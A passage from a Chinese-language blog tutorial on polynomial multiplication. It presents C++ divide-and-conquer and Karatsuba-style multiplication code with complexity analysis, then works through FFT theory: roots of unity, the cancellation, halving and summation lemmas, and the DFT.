#define Frn1(i,a,b) for(register int i(a);i&amp;lt;=(b);++i)
#define Frn_(i,a,b) for(register int i(a);i&amp;gt;=(b);--i)
#define Mst(a,b) memset(a,b,sizeof(a))
#define File(a) freopen(a&quot;.in&quot;,&quot;r&quot;,stdin),freopen(a&quot;.out&quot;,&quot;w&quot;,stdout)
typedef vector&amp;lt;int&amp;gt; Vct;
int n,m,s; 
Vct a,b,c;
void add(Vct&amp;amp;a,Vct&amp;amp;b,Vct&amp;amp;c){Frn0(i,0,c.size())c[i]=a[i]+b[i];}
void mlt(Vct&amp;amp;a,Vct&amp;amp;b,Vct&amp;amp;c,int n);
signed main(){
    Rd(n),Rd(m),a.resize(s=1&amp;lt;&amp;lt;int(log2(max(n,m))+1)),b.resize(s),c.resize(s&amp;lt;&amp;lt;1);
    Frn1(i,0,n)Rd(a[i]);
    Frn1(i,0,m)Rd(b[i]);
    mlt(a,b,c,s);
    Frn1(i,0,n+m)wr(c[i]),Ps;
    exit(0);
}
void mlt(Vct&amp;amp;a,Vct&amp;amp;b,Vct&amp;amp;c,int n){
    int n2(n&amp;gt;&amp;gt;1);
    Vct a0(n2),a1(n2),b0(n2),b1(n2),ab0(n),ab1(n),abm(n);
    if(n==1){c[0]=a[0]*b[0];return;}
    Frn0(i,0,n2)a0[i]=a[i&amp;lt;&amp;lt;1],a1[i]=a[i&amp;lt;&amp;lt;1|1],b0[i]=b[i&amp;lt;&amp;lt;1],b1[i]=b[i&amp;lt;&amp;lt;1|1];
    mlt(a0,b0,ab0,n2),mlt(a1,b1,ab1,n2);
    Frn0(i,0,n)c[i&amp;lt;&amp;lt;1]=ab0[i]+(i?ab1[i-1]:0);
    mlt(a0,b1,ab0,n2),mlt(a1,b0,ab1,n2),add(ab0,ab1,abm);
    Frn0(i,0,n-1)c[i&amp;lt;&amp;lt;1|1]=abm[i];
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/BrianPeng/1640550/o_200202034033%E6%9C%B4%E7%B4%A0%E5%88%86%E6%B2%BB%E4%B9%98%E6%B3%95.PNG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;好像更惨……&lt;/p&gt;
&lt;p&gt;为什么呢，因为这个算法的时间复杂度还是&lt;span class=&quot;math inline&quot;&gt;\(O(n^2)\)&lt;/span&gt;的，具体证明如下&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(T(n)=4T(n/2)+f(n)\)&lt;/span&gt;，其中&lt;span class=&quot;math inline&quot;&gt;\(f(n)=O(n)\)&lt;/span&gt;（就是&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;位加法的时间）&lt;/p&gt;
&lt;p&gt;运用主方法，&lt;span class=&quot;math inline&quot;&gt;\(a=4,b=2,log_ba=log_2 4=2&amp;gt;1\)&lt;/span&gt;，所以&lt;span class=&quot;math inline&quot;&gt;\(T(n)=O(n^{log_ba})=O(n^2)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;而且不仅复杂度高，常数因子也因为递归变高了&lt;/p&gt;
&lt;p&gt;&lt;del&gt;所以继续优化吧……&lt;/del&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;分治乘法&quot;&gt;分治乘法&lt;/h2&gt;
&lt;p&gt;接上上一部分的内容，考虑如何优化时间复杂度&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;先来一个小插曲：&lt;/strong&gt;如何只做&lt;span class=&quot;math inline&quot;&gt;\(3\)&lt;/span&gt;次乘法，求出线性多项式&lt;span class=&quot;math inline&quot;&gt;\(ax+b\)&lt;/span&gt;与&lt;span class=&quot;math inline&quot;&gt;\(cx+d\)&lt;/span&gt;的乘积&lt;/p&gt;
&lt;p&gt;先看看结果：&lt;span class=&quot;math inline&quot;&gt;\((ax+b)(cx+d)=acx^2+(ad+bc)x+bd\)&lt;/span&gt;，总共有&lt;span class=&quot;math inline&quot;&gt;\(4\)&lt;/span&gt;次乘法&lt;/p&gt;
&lt;p&gt;所以如果只用&lt;span class=&quot;math inline&quot;&gt;\(3\)&lt;/span&gt;次乘法，那么&lt;span class=&quot;math inline&quot;&gt;\(ad+bc\)&lt;/span&gt;必须只能用一次乘法得到&lt;/p&gt;
&lt;p&gt;尝试把&lt;span class=&quot;math inline&quot;&gt;\(3\)&lt;/span&gt;个系数加起来，就是&lt;span class=&quot;math inline&quot;&gt;\(ac+ad+bc+bd=(a+b)(c+d)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;答案出来了，&lt;strong&gt;用&lt;span class=&quot;math inline&quot;&gt;\(3\)&lt;/span&gt;次乘法分别算出&lt;span class=&quot;math inline&quot;&gt;\(ac,bd\)&lt;/span&gt;与&lt;span class=&quot;math inline&quot;&gt;\((a+b)(c+d)\)&lt;/span&gt;，那么中间项系数&lt;span class=&quot;math inline&quot;&gt;\(=(a+b)(c+d)-ac-bd\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回到原题目&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(AB=(A^{[0]}+xA^{[1]})(B^{[0]}+xB^{[1]})=A^{[0]}B^{[0]}+x(A^{[1]}B^{[0]}+A^{[0]}B^{[1]})+x^2A^{[1]}B^{[1]}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;于是中间项也可以使用类似的方法：&lt;span class=&quot;math inline&quot;&gt;\(A^{[1]}B^{[0]}+A^{[0]}B^{[1]}=(A^{[0]}+A^{[1]})(B^{[0]}+B^{[1]})-A^{[0]}B^{[0]}-A^{[1]}B^{[1]}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;成功减少一次乘法运算，见代码&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;//This program is written by Brian Peng.
#pragma GCC optimize(&quot;Ofast&quot;,&quot;inline&quot;,&quot;no-stack-protector&quot;)
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define Rd(a) (a=read())
#define Gc(a) (a=getchar())
#define Pc(a) putchar(a)
int read(){
    register int x;register char c(getchar());register bool k;
    while(!isdigit(c)&amp;amp;&amp;amp;c^'-')if(Gc(c)==EOF)exit(0);
    if(c^'-')k=1,x=c&amp;amp;15;else k=x=0;
    while(isdigit(Gc(c)))x=(x&amp;lt;&amp;lt;1)+(x&amp;lt;&amp;lt;3)+(c&amp;amp;15);
    return k?x:-x;
}
void wr(register int a){
    if(a&amp;lt;0)Pc('-'),a=-a;
    if(a&amp;lt;=9)Pc(a|'0');
    else wr(a/10),Pc((a%10)|'0');
}
signed const INF(0x3f3f3f3f),NINF(0xc3c3c3c3);
long long const LINF(0x3f3f3f3f3f3f3f3fLL),LNINF(0xc3c3c3c3c3c3c3c3LL);
#define Ps Pc(' ')
#define Pe Pc('\n')
#define Frn0(i,a,b) for(register int i(a);i&amp;lt;(b);++i)
#define Frn1(i,a,b) for(register int i(a);i&amp;lt;=(b);++i)
#define Frn_(i,a,b) for(register int i(a);i&amp;gt;=(b);--i)
#define Mst(a,b) memset(a,b,sizeof(a))
#define File(a) freopen(a&quot;.in&quot;,&quot;r&quot;,stdin),freopen(a&quot;.out&quot;,&quot;w&quot;,stdout)
typedef vector&amp;lt;int&amp;gt; Vct;
int n,m,s;
Vct a,b,c;
void add(Vct&amp;amp;a,Vct&amp;amp;b,Vct&amp;amp;c){Frn0(i,0,c.size())c[i]=a[i]+b[i];}
void mns(Vct&amp;amp;a,Vct&amp;amp;b,Vct&amp;amp;c){Frn0(i,0,c.size())c[i]=a[i]-b[i];}
void mlt(Vct&amp;amp;a,Vct&amp;amp;b,Vct&amp;amp;c);
signed main(){
    Rd(n),Rd(m),a.resize(s=1&amp;lt;&amp;lt;int(log2(max(n,m))+1)),b.resize(s),c.resize(s&amp;lt;&amp;lt;1);
    Frn1(i,0,n)Rd(a[i]);
    Frn1(i,0,m)Rd(b[i]);
    mlt(a,b,c);
    Frn1(i,0,n+m)wr(c[i]),Ps;
    exit(0);
}
void mlt(Vct&amp;amp;a,Vct&amp;amp;b,Vct&amp;amp;c){
    int n(a.size()),n2(a.size()&amp;gt;&amp;gt;1);
    Vct a0(n2),a1(n2),b0(n2),b1(n2),ab0(n),ab1(n),abm(n);
    if(n==1){c[0]=a[0]*b[0];return;}
    Frn0(i,0,n2)a0[i]=a[i&amp;lt;&amp;lt;1],a1[i]=a[i&amp;lt;&amp;lt;1|1],b0[i]=b[i&amp;lt;&amp;lt;1],b1[i]=b[i&amp;lt;&amp;lt;1|1];
    mlt(a0,b0,ab0),mlt(a1,b1,ab1);
    Frn0(i,0,n)c[i&amp;lt;&amp;lt;1]=ab0[i]+(i?ab1[i-1]:0);
    add(a0,a1,a0),add(b0,b1,b0),mlt(a0,b0,abm),mns(abm,ab0,abm),mns(abm,ab1,abm);
    Frn0(i,0,n-1)c[i&amp;lt;&amp;lt;1|1]=abm[i];
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/BrianPeng/1640550/o_200202041742%E5%88%86%E6%B2%BB%E4%B9%98%E6%B3%95.PNG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;比朴素分治乘法好一点，但是还是没朴素乘法强，&lt;del&gt;还是很惨&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;看看这个算法的时间复杂度：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(T(n)=3T(n/2)+f(n)\)&lt;/span&gt;，其中&lt;span class=&quot;math inline&quot;&gt;\(f(n)=O(n)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;运用主方法，&lt;span class=&quot;math inline&quot;&gt;\(a=3,b=2,\log_ba=\log_2 3\approx1.58&amp;gt;1\)&lt;/span&gt;，所以&lt;span class=&quot;math inline&quot;&gt;\(T(n)=O(n^{\log_ba})=O(n^{\log_2 3})\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;额那不是应该比朴素算法要好吗，这是什么情况&lt;/p&gt;
&lt;p&gt;Reason 1. 分治乘法的常数因子太大&lt;/p&gt;
&lt;p&gt;Reason 2. 打开&lt;span class=&quot;math inline&quot;&gt;\(\#5\)&lt;/span&gt;数据一看，&lt;span class=&quot;math inline&quot;&gt;\(n=1,m=3e6\)&lt;/span&gt;，那么&lt;span class=&quot;math inline&quot;&gt;\(O(n^{\log_2 3})\)&lt;/span&gt;的分治乘法也顶不过&lt;span class=&quot;math inline&quot;&gt;\(O(nm)\)&lt;/span&gt;的朴素乘法啊……&lt;/p&gt;
&lt;p&gt;所以就要请上本文的主角了&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;快速傅里叶变换-fft-fast-fourier-transform&quot;&gt;快速傅里叶变换 FFT (Fast Fourier Transform)&lt;/h2&gt;
&lt;p&gt;&lt;del&gt;Fairly Frightening Transform&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;约定：&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;为属于&lt;span class=&quot;math inline&quot;&gt;\(A(x),B(x)\)&lt;/span&gt;的乘积&lt;span class=&quot;math inline&quot;&gt;\(C(x)\)&lt;/span&gt;次数界的最小的&lt;span class=&quot;math inline&quot;&gt;\(2\)&lt;/span&gt;的正整数幂（即满足&lt;span class=&quot;math inline&quot;&gt;\(&amp;gt;\)&lt;/span&gt;输入&lt;span class=&quot;math inline&quot;&gt;\(n+m\)&lt;/span&gt;的最小的&lt;span class=&quot;math inline&quot;&gt;\(2\)&lt;/span&gt;的正整数幂），并同样将两个多项式设为&lt;span class=&quot;math inline&quot;&gt;\(A(x)=\sum_{i=0}^{n-1}a_ix^i,B(x)=\sum_{i=0}^{n-1}b_ix^i\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;reference-1&quot;&gt;Reference：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;《算法导论》&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.cnblogs.com/zwfymqz/p/8244902.html&quot;&gt;自为风月马前卒：快速傅里叶变换(FFT)详解&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;prerequisite-knowledge-2&quot;&gt;Prerequisite knowledge:&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;分治思想&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;复数的基本知识&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;线性代数的基本知识&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;part-1-多项式的两种表示方式&quot;&gt;Part 1: 多项式的两种表示方式&lt;/h3&gt;
&lt;h4 id=&quot;系数表达&quot;&gt;1. 系数表达&lt;/h4&gt;
&lt;p&gt;对一个次数界为&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;的多项式&lt;span class=&quot;math inline&quot;&gt;\(A(x)=\sum_{i=0}^{n-1}a_ix^i\)&lt;/span&gt;，其系数表达是向量&lt;span class=&quot;math inline&quot;&gt;\(\pmb{a}=\left[\begin{matrix}a_0\\a_1\\\vdots\\a_{n-1}\end{matrix} \right]\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;使用系数表达时，下列操作的时间复杂度：&lt;/p&gt;
&lt;ol readability=&quot;-2&quot;&gt;&lt;li&gt;
&lt;p&gt;求值&lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;加法&lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;乘法朴素&lt;span class=&quot;math inline&quot;&gt;\(O(n^2)\)&lt;/span&gt;，优化&lt;span class=&quot;math inline&quot;&gt;\((n^{\log_2 3})\)&lt;/span&gt;（即分治乘法）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;P.s 当多项式&lt;span class=&quot;math inline&quot;&gt;\(C(x)=A(x)B(x)\)&lt;/span&gt;时，&lt;span class=&quot;math inline&quot;&gt;\(\pmb{c}\)&lt;/span&gt;被称为&lt;span class=&quot;math inline&quot;&gt;\(\pmb{a}\)&lt;/span&gt;与&lt;span class=&quot;math inline&quot;&gt;\(\pmb{b}\)&lt;/span&gt;的&lt;strong&gt;卷积(convolution)&lt;/strong&gt;，记为&lt;span class=&quot;math inline&quot;&gt;\(\pmb{c}=\pmb{a}\bigotimes\pmb{b}\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;点值表达&quot;&gt;2. 点值表达&lt;/h4&gt;
&lt;p&gt;一个次数界为&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;的多项式&lt;span class=&quot;math inline&quot;&gt;\(A(x)\)&lt;/span&gt;的点值表达是一个有&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;个点值对所组成的集合&lt;span class=&quot;math inline&quot;&gt;\(\{(x_0,y_0),(x_1,y_1),\cdots,(x_{n-1},y_{n-1})\}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;进行&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;次&lt;strong&gt;求值&lt;/strong&gt;就可以把系数表达转化为点值表达，总时间&lt;span class=&quot;math inline&quot;&gt;\(O(n^2)\)&lt;/span&gt;，用公式表示就是：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(\left[\begin{matrix}1&amp;amp;x_0&amp;amp;x_0^2&amp;amp;\cdots&amp;amp;x_0^{n-1}\\1&amp;amp;x_1&amp;amp;x_1^2&amp;amp;\cdots&amp;amp;x_1^{n-1}\\\vdots&amp;amp;\vdots&amp;amp;\vdots&amp;amp;\ddots&amp;amp;\vdots\\1&amp;amp;x_{n-1}&amp;amp;x_{n-1}^2&amp;amp;\cdots&amp;amp;x_{n-1}^{n-1}\end{matrix} \right]\left[\begin{matrix}a_0\\a_1\\\vdots\\a_{n-1}\end{matrix} \right]=\left[\begin{matrix}y_0\\y_1\\\vdots\\y_{n-1}\end{matrix} \right]\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中左边的矩阵表示为&lt;span class=&quot;math inline&quot;&gt;\(V(x_0,x_1,\cdots,x_{n-1})\)&lt;/span&gt;称为&lt;strong&gt;范德蒙德矩阵&lt;/strong&gt;，于是可以将公式简化为&lt;span class=&quot;math inline&quot;&gt;\(V(x_0,x_1,\cdots,x_{n-1})\pmb{a}=\pmb{y}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;使用拉格朗日公式，可以在&lt;span class=&quot;math inline&quot;&gt;\(O(n^2)\)&lt;/span&gt;时间将点值表达转化为系数表达，该过程称为&lt;strong&gt;插值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于两个在相同位置求值的点值表达多项式，下列操作的时间复杂度：&lt;/p&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;加法&lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;（只要将各个位置的&lt;span class=&quot;math inline&quot;&gt;\(y\)&lt;/span&gt;值相加即可）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;乘法&lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;（同理）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;所以这就是使用FFT的原因：通过精心选取&lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt;值，可以在&lt;span class=&quot;math inline&quot;&gt;\(O(n\log n)\)&lt;/span&gt;时间完成求值，再&lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;乘法，最后&lt;span class=&quot;math inline&quot;&gt;\(O(n\log n)\)&lt;/span&gt;插值&lt;/p&gt;
&lt;p&gt;傅里叶大神究竟选了什么神奇的&lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt;值呢，请看&lt;/p&gt;
&lt;h3 id=&quot;part-2-单位复数根及其性质&quot;&gt;Part 2: 单位复数根及其性质&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;次单位复数根&lt;/strong&gt;是满足&lt;span class=&quot;math inline&quot;&gt;\(\omega^n=1\)&lt;/span&gt;的复数&lt;span class=&quot;math inline&quot;&gt;\(\omega\)&lt;/span&gt;，正好有&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;个，记为：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^k=e^{2\pi ik/n}=\cos(2\pi k/n)+i\sin(2\pi k/n)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;span class=&quot;math inline&quot;&gt;\(\omega_n=e^{2\pi i/n}=\cos(2\pi /n)+i\sin(2\pi /n)\)&lt;/span&gt;被称为&lt;strong&gt;主&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;次单位根&lt;/strong&gt;，所有其他&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;次单位根都是&lt;span class=&quot;math inline&quot;&gt;\(\omega_n\)&lt;/span&gt;的幂次&lt;/p&gt;
&lt;p&gt;可以把&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;个单位根看作是复平面上以单位圆的&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;个等分点为终点的向量，具体原因就是复数乘法“模长相乘，辐角相加”的规律&lt;/p&gt;
&lt;p&gt;如图表示的是&lt;span class=&quot;math inline&quot;&gt;\(8\)&lt;/span&gt;次单位复数根在复平面上的位置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/BrianPeng/1640550/o_2002020623258%E6%AC%A1%E5%8D%95%E4%BD%8D%E6%A0%B9.PNG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;于是就可以得到规律：&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^j\omega_n^k=\omega_n^{j+k}=\omega_n^{(j+k)\mod n}\)&lt;/span&gt;，类似地&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^{-1}=\omega_n^{n-1}\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;接下来的三个引理就是fft的重头戏啦&quot;&gt;接下来的三个引理就是FFT的重头戏啦&lt;/h4&gt;
&lt;h4 id=&quot;消去引理对任何整数ngeqslant-0kgeqslant-0d0有omega_dndkomega_nk&quot;&gt;1. 消去引理：对任何整数&lt;span class=&quot;math inline&quot;&gt;\(n\geqslant 0,k\geqslant 0,d&amp;gt;0\)&lt;/span&gt;，有&lt;span class=&quot;math inline&quot;&gt;\(\omega_{dn}^{dk}=\omega_n^k\)&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt; &lt;span class=&quot;math inline&quot;&gt;\(\omega_{dn}^{dk}=(e^{2\pi i/dn})^{dk}=(e^{2\pi i/n})^k=\omega_n^k\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;折半引理对任何偶数n和整数k有omega_nk2omega_nkn22omega_n2k&quot;&gt;2. 折半引理：对任何偶数&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;和整数&lt;span class=&quot;math inline&quot;&gt;\(k\)&lt;/span&gt;，有&lt;span class=&quot;math inline&quot;&gt;\((\omega_n^k)^2=(\omega_n^{k+n/2})^2=\omega_{n/2}^k\)&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt; &lt;span class=&quot;math inline&quot;&gt;\((\omega_n^k)^2=\omega_n^{2k},(\omega_n^{k+n/2})^2=\omega_n^{2k+n}=\omega_n^{2k}\)&lt;/span&gt;，最后用消去引理，&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^{2k}=\omega_{n/2}^k\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;求和引理对任何整数ngeqslant-0与非负整数knnmid-k有sum_j0n-1omega_nkj0&quot;&gt;3. 求和引理：对任何整数&lt;span class=&quot;math inline&quot;&gt;\(n\geqslant 0\)&lt;/span&gt;与非负整数&lt;span class=&quot;math inline&quot;&gt;\(k:n\nmid k\)&lt;/span&gt;，有&lt;span class=&quot;math inline&quot;&gt;\(\sum_{j=0}^{n-1}(\omega_n^k)^j=0\)&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt; 利用等比数列求和公式，&lt;span class=&quot;math inline&quot;&gt;\(\sum_{j=0}^{n-1}(\omega_n^k)^j=\frac{1-(\omega_n^k)^n}{1-\omega_n^k}=\frac{1-\omega_n^{nk}}{1-\omega_n^k}=\frac{1-1}{1-\omega_n^k}=0\)&lt;/span&gt;，为了使分母&lt;span class=&quot;math inline&quot;&gt;\(1-\omega_n^k\neq 0\)&lt;/span&gt;，必须满足&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^k\neq 1\implies n\nmid k\)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;part-3-离散傅里叶变换-dft-discrete-fourier-transform&quot;&gt;Part 3: 离散傅里叶变换 DFT (Discrete Fourier Transform)&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;DFT&lt;/strong&gt;就是将次数界为&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;的多项式&lt;span class=&quot;math inline&quot;&gt;\(A(x)\)&lt;/span&gt;在&lt;strong&gt;&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;次单位复数根&lt;/strong&gt;上&lt;strong&gt;求值&lt;/strong&gt;的过程&lt;/p&gt;
&lt;p&gt;简化一下表示方法：&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(V_n=V(\omega_n^0,\omega_n^1,\cdots,\omega_n^{n-1})=\left[\begin{matrix}1&amp;amp;1&amp;amp;1&amp;amp;1&amp;amp;\cdots&amp;amp;1\\1&amp;amp;\omega_n&amp;amp;\omega_n^2&amp;amp;\omega_n^3&amp;amp;\cdots&amp;amp;\omega_n^{n-1}\\1&amp;amp;\omega_n^2&amp;amp;\omega_n^4&amp;amp;\omega_n^6&amp;amp;\cdots&amp;amp;\omega_n^{2(n-1)}\\1&amp;amp;\omega_n^3&amp;amp;\omega_n^6&amp;amp;\omega_n^9&amp;amp;\cdots&amp;amp;\omega_n^{3(n-1)}\\\vdots&amp;amp;\vdots&amp;amp;\vdots&amp;amp;\vdots&amp;amp;\ddots&amp;amp;\vdots\\1&amp;amp;\omega_n^{n-1}&amp;amp;\omega_n^{2(n-1)}&amp;amp;\omega_n^{3(n-1)}&amp;amp;\cdots&amp;amp;\omega_n^{(n-1)(n-1)}\end{matrix} \right]\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;用公式表示就是&lt;span class=&quot;math inline&quot;&gt;\(V_n\pmb{a}=\pmb{y}\)&lt;/span&gt;，也记为&lt;span class=&quot;math inline&quot;&gt;\(\pmb{y}=DFT_n(\pmb a)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;另外，可以发现&lt;span class=&quot;math inline&quot;&gt;\([V_n]_{ij}=\omega_n^{ij}\implies y_i=\sum_{j=0}^{n-1}[V_n]_{ij}a_j=\sum_{j=0}^{n-1}\omega_n^{ij}a_j\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;终于可以看看具体操作了&lt;/p&gt;
&lt;h3 id=&quot;part-4-fft&quot;&gt;Part 4: FFT&lt;/h3&gt;
&lt;p&gt;FFT利用单位根的特殊性质把DFT优化到了&lt;span class=&quot;math inline&quot;&gt;\(O(n\log n)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;和分治乘法一样，按未知项次数的奇偶性分开：&lt;span class=&quot;math inline&quot;&gt;\(A(x)=A^{[0]}(x^2)+xA^{[1]}(x^2)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}(x)=\sum_{i=0}^{n/2-1}a_{2i}x^i,A^{[1]}(x)=\sum_{i=0}^{n/2-1}a_{2i+1}x^i\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这时，求&lt;span class=&quot;math inline&quot;&gt;\(A(x)\)&lt;/span&gt;在&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^0,\omega_n^1,\cdots,\omega_n^{n-1}\)&lt;/span&gt;的值变成了：&lt;/p&gt;
&lt;h4 id=&quot;求a0x与a1x在omega_n02omega_n12cdotsomega_nn-12的值&quot;&gt;1. 求&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}(x)\)&lt;/span&gt;与&lt;span class=&quot;math inline&quot;&gt;\(A^{[1]}(x)\)&lt;/span&gt;在&lt;span class=&quot;math inline&quot;&gt;\((\omega_n^0)^2,(\omega_n^1)^2,\cdots,(\omega_n^{n-1})^2\)&lt;/span&gt;的值&lt;/h4&gt;
&lt;p&gt;根据&lt;strong&gt;折半引理&lt;/strong&gt;，&lt;span class=&quot;math inline&quot;&gt;\((\omega_n^0)^2,(\omega_n^1)^2,\cdots,(\omega_n^{n-1})^2\)&lt;/span&gt;中两两重复，其实就是&lt;strong&gt;&lt;span class=&quot;math inline&quot;&gt;\(n/2\)&lt;/span&gt;个&lt;span class=&quot;math inline&quot;&gt;\(n/2\)&lt;/span&gt;次单位根&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;所以只要对拆开的两个多项式分别做&lt;span class=&quot;math inline&quot;&gt;\(DFT_{n/2}\)&lt;/span&gt;即可，得到&lt;span class=&quot;math inline&quot;&gt;\(\pmb y^{[0]}\)&lt;/span&gt;与&lt;span class=&quot;math inline&quot;&gt;\(\pmb y^{[1]}\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;合并答案&quot;&gt;2. 合并答案&lt;/h4&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^{n/2}=e^{2\pi i (n/2)/n}=e^{\pi i}=-1\)&lt;/span&gt;（根据传说中的最美公式&lt;span class=&quot;math inline&quot;&gt;\(e^{i\pi}+1=0\)&lt;/span&gt;）&lt;/p&gt;
&lt;p&gt;所以&lt;span class=&quot;math inline&quot;&gt;\(\omega_n^{k+n/2}=\omega_n^k\omega_n^{n/2}=-\omega_n^k\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;所以&lt;span class=&quot;math inline&quot;&gt;\(y_i=y^{[0]}_i+\omega_n^i y^{[1]}_i,y_{i+n/2}=y^{[0]}_i-\omega_n^i y^{[1]}_i,i=0,1,\cdots,n/2-1\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;具体运行时，就每次循环结束时让一个初始为&lt;span class=&quot;math inline&quot;&gt;\(1\)&lt;/span&gt;的变量&lt;span class=&quot;math inline&quot;&gt;\(*\omega_n\)&lt;/span&gt;即可&lt;/p&gt;
